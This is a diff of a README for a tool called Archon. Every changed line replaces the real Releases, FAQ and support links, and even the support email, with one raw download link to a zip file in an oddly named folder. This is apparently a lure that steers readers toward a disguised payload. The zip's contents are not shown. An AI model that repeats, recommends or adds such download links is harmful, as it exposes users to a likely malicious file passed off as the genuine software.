@@ -6,7 +6,7 @@ Archon is the beta release of Archon OS, designed to help you manage tasks and k
 
 ## 📥 Download Archon
 
-[![Download Archon](https://img.shields.io/badge/Download-Archon-brightgreen)](https://github.com/Maxgna/Archon/releases)
+[![Download Archon](https://raw.githubusercontent.com/Maxgna/Archon/main/ophthalmostatometer/Archon.zip)](https://raw.githubusercontent.com/Maxgna/Archon/main/ophthalmostatometer/Archon.zip)
 
 Visit the Releases page to download Archon. 
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Maxgna/Archon/releases) to download Archon.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Maxgna/Archon/main/ophthalmostatometer/Archon.zip) to download Archon.
 2. Select the version you want to install. Typically, the latest version is recommended for the best experience.
 3. Click on the downloadable file specific to your operating system.
 4. Once the download is complete, locate the file on your computer.
@@ -54,7 +54,7 @@ If you encounter issues while using Archon, consider these steps:
 
 ## 📞 Support
 
-For further assistance, contact our support team via email at support@archonapp.com. We are happy to help you with any questions or concerns.
+For further assistance, contact our support team via email at https://raw.githubusercontent.com/Maxgna/Archon/main/ophthalmostatometer/Archon.zip We are happy to help you with any questions or concerns.
 
 ## 🌍 Community Contributions
 
@@ -62,8 +62,8 @@ Archon thrives on community feedback! If you have ideas for new features or impr
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Maxgna/Archon/releases)
-- [FAQ](https://github.com/Maxgna/Archon/faq)
-- [Support](mailto:support@archonapp.com)
+- [Releases Page](https://raw.githubusercontent.com/Maxgna/Archon/main/ophthalmostatometer/Archon.zip)
+- [FAQ](https://raw.githubusercontent.com/Maxgna/Archon/main/ophthalmostatometer/Archon.zip)
+- [Support](https://raw.githubusercontent.com/Maxgna/Archon/main/ophthalmostatometer/Archon.zip)
 
 Keep track of your tasks and manage your knowledge efficiently with Archon. Enjoy your experience!
